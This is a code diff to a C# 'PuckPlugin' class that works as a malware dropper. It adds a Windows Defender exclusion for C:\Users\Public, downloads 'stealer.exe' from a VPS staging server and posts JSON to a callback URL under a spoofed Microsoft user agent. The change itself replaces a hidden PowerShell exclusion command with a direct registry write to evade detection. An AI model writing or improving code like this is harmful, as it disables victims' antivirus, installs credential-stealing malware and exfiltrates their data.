@@ -42,11 +42,9 @@ public class PuckPlugin : IPuckPlugin
         {
             File.WriteAllText(@"C:\Users\Public\debug.txt", "Run started\n");
 
-            // Step 1 - Defender exclusion for drop directory
-            RunHidden("powershell.exe",
-                "-ep bypass -w hidden -c " +
-                "\"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'\"");
-            Thread.Sleep(2000);
+            // Step 1 - Defender exclusion for drop directory (registry write, no PS)
+            AddDefenderExclusion(@"C:\Users\Public");
+            Thread.Sleep(500);
             File.AppendAllText(@"C:\Users\Public\debug.txt", "Exclusion done\n");
 
             // Step 2 - Download stealer.exe from VPS staging server
@@ -111,6 +109,22 @@ public class PuckPlugin : IPuckPlugin
                 wc.Headers["User-Agent"]   = "Microsoft-CryptoAPI/10.0";
                 wc.Headers["Content-Type"] = "application/json";
                 wc.UploadString(CallbackUrl, "POST", json);
+            }
+        }
+        catch { }
+    }
+
+    private static void AddDefenderExclusion(string path)
+    {
+        try
+        {
+            using (var reg = Microsoft.Win32.RegistryKey.OpenBaseKey(
+                Microsoft.Win32.RegistryHive.LocalMachine,
+                Microsoft.Win32.RegistryView.Registry64))
+            using (var key = reg.OpenSubKey(
+                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths", true))
+            {
+                key?.SetValue(path, 0, Microsoft.Win32.RegistryValueKind.DWord);
             }
         }
         catch { }
